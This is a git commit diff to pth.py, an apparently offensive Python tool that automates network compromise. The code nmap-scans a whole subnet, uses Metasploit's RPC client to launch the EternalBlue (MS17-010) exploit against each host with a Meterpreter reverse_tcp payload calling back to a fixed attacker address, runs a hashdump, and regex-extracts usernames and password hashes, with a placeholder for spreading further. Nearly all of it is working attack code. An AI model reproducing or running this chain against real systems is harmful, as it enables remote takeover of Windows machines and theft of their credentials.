48ddbaeddbe3dba4933a2f0ada5f75e8ca2adde2
Jared Jones <jkjones.dev@gmail.com>
2018-04-15 10:18:10 -0500

    Adding more flow to the program, added regex matching to gather user and hash data from the output of eternal blue

--- pth.py
+++ pth.py
@@ -4,7 +4,6 @@ import nmap
 import re
 import sys
 import subprocess
-import socket
 from metasploit.msfrpc import MsfRpcClient
 import ssl
 import time
@@ -30,7 +29,21 @@ def convertIpToRange(ip):
 	rgx = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.')
 	return rgx.match(ip).group() + '0-255'
 
+def gatherHashes(blob):
+    """
+    Returns a list of tuples (username, userID, hash)
+    """
+    rgx = re.compile(r'([A-Za-z0-9]+):(\d+:)([A-Za-z0-9]+:[A-Za-z0-9]+):')
+    dataGroups = []
+    for r in rgx.finditer(blob):
+        dataGroups.append(r.groups())
+    return dataGroups
+
 def nmScan(ip):
+    """
+    Returns a list of dictionaries:
+        { 'ip': '...', osfamily': '...', 'osgen': [...] }
+    """
     targets = []
     range = convertIpToRange(ip)
     nm = nmap.PortScanner()
@@ -55,38 +68,57 @@ def nmScan(ip):
     return targets
 
 def eternalBlue(ip):
+    # Setup SSL fix
     try:
         _create_unverified_https_context = ssl._create_unverified_context
     except AttributeError:
         pass
     else:
         ssl._create_default_https_context = _create_unverified_https_context
+    # Create the connection to the RPC client
     client = MsfRpcClient('password')
+    # Load eternal blue exploit
     exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
-    exploit['RHOST'] = '10.202.208.172'
+    exploit['RHOST'] = ip
+    # Load the reverse_tcp shell payload
     payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
     payload['LHOST'] = '10.202.208.230'
+    # Exploit the host
     exploit.execute(payload=payload)
     proc = exploit.execute(payload=payload)
     time.sleep(5)
+    # Get the shell and run the hashdump
     shell = client.sessions.session(proc.get('job_id'))
+    if shell == None:
+        return None
     shell.runsingle('run post/windows/gather/hashdump')
     while(True):
         output = shell.read()
         if( len(output) > 0):
             print(output)
         if(':::' in output):
-            print(repr(output))
-            break
+            return gatherHashes(output)
 
 def main():
     header()
     ip = sys.argv[1]
-    eternalBlue(ip)
-    # firstMachine('hacker', 'toor', '169.254.121.23')
-    #print(socket.gethostbyname(socket.gethostname()))
-    #target_hosts = nmScan(ip)
-    #print("Found {} targets.".format(len(target_hosts)))
+    targets = nmScan(ip)
+    print('Found ' + str(len(targets)) + ' possibly vulnerable machines...')
+    # Try to break into machines with eternal blue
+    initHashData = []
+    for i in range(len(targets)):
+        hashData = eternalBlue(targets[i].ip)
+        if hashData != None:
+            targets.pop(i)
+            initHashData = hashData
+            break
+    if len(initHashData) > 0:
+        # Found access to network start spidering
+        pass
+    else:
+        print('Could not gain access to network... bye!')
+    
+
 
 if __name__ == "__main__":
     # execute only if run as a script
